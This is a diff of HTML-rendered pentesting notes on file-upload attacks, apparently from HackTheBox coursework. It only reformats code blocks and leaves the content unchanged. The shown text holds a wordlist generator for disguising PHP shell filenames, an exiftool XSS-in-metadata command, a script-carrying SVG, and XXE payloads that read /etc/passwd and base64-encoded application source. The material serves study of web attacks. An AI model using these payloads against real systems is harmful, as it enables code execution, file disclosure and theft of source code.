@@ -1430,22 +1430,20 @@
 </table>
 <p><strong>Note:</strong> A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.</p>
 <h3 id="creating-character-injection-wordlist">Creating Character Injection Wordlist</h3>
-<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span>char<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;%20&#39;</span><span class="w"> </span><span class="s1">&#39;%0a&#39;</span><span class="w"> </span><span class="s1">&#39;%00&#39;</span><span class="w"> </span><span class="s1">&#39;%0d0a&#39;</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span><span class="s1">&#39;.\\&#39;</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="s1">&#39;…&#39;</span><span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">    </span><span class="k">for</span><span class="w"> </span>ext<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;.php&#39;</span><span class="w"> </span><span class="s1">&#39;.phps&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="c1"># can add more php ext here</span>
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$char$ext</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$ext$char</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$char$ext</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$ext$char</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">    </span><span class="k">done</span>
-<span class="k">done</span>
-</code></pre></div>
-
+<pre><code class="language-bash">for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do # can add more php ext here
+        echo &quot;shell$char$ext.jpg&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell$ext$char.jpg&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell.jpg$char$ext&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell.jpg$ext$char&quot; &gt;&gt; wordlist.txt
+    done
+done
+</code></pre>
 <h3 id="limiting-content-type-wordlist-example">Limiting Content-Type wordlist example</h3>
-<div class="codehilite"><pre><span></span><code>wget<span class="w"> </span>https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
-cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>image-content-types.txt<span class="w"> </span><span class="c1"># method 1</span>
-cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xclip<span class="w"> </span>-se<span class="w"> </span>c<span class="w"> </span><span class="c1"># method 2</span>
-</code></pre></div>
-
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+cat web-all-content-types.txt | grep 'image/' &gt; image-content-types.txt # method 1
+cat web-all-content-types.txt | grep 'image/' | xclip -se c # method 2
+</code></pre>
 <h2 id="limited-uploads">Limited Uploads</h2>
 <ul>
 <li>Secure filters not exploitable with above techniques</li>
@@ -1477,39 +1475,35 @@ cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><spa
 <ul>
 <li>Adding XSS payload to an image's metadata:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s1">&#39; &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#39;</span><span class="w"> </span>HTB.jpg
-exiftool<span class="w"> </span>HTB.jpg
-</code></pre></div>
-
+<pre><code class="language-bash">exiftool -Comment=' &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg
+exiftool HTB.jpg
+</code></pre>
 <ul>
 <li>Change the image's MIME-Type to text/html, web apps may show it as an HTML document instead of an image, thus the XSS payload would be triggered.</li>
 <li>Scalable Vector Graphics (SVG) images are XML-based. For this reason, we can modify their XML data to include an XSS payload: </li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span>
-<span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
-<span class="w">    </span><span class="nt">&lt;rect</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">fill=</span><span class="s">&quot;green&quot;</span><span class="w"> </span><span class="na">stroke=</span><span class="s">&quot;black&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
-<span class="w">    </span><span class="nt">&lt;script</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>alert(window.origin);<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/svg&gt;</span>
-</code></pre></div>
-
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1&quot; height=&quot;1&quot;&gt;
+    &lt;rect x=&quot;1&quot; y=&quot;1&quot; width=&quot;1&quot; height=&quot;1&quot; fill=&quot;green&quot; stroke=&quot;black&quot; /&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;alert(window.origin);&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
 <h3 id="xxe">XXE</h3>
 <ul>
 <li>SVG/XML example:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><span class="w"> </span>]&gt;
-<span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
-</code></pre></div>
-
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
+</code></pre>
 <ul>
 <li>Another example but to read the web apps source code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</span><span class="w"> </span>]&gt;
-<span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
-</code></pre></div>
-
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
+</code></pre>
 <ul>
 <li>View page source of the upload page to see the returned file from above payload.</li>
 <li>PDF, Word Documents, PowerPoint Documents all include XML elements.</li>
